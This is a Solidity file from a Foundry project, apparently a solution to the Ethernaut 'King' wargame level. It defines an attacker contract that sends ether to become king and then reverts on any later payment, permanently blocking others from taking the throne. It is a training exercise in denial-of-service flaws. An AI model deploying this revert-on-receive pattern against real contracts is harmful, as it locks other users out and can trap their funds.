// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {King} from "../../src/ethernaut/09_King/King.sol";

contract King_Attacker {
	address player;
	King coreInst;
	bool isAttackDone = false;
	
	constructor(King coreInst_) payable {
		player = msg.sender;
		coreInst = coreInst_;
	}
	
	receive() external payable {
		if (!isAttackDone) {
			isAttackDone = true;
		}
		else {
			revert("Just Stop !");
		}
	}
	
	function doAttack() public {
		address(coreInst).call{value: address(this).balance}("");
	}
}
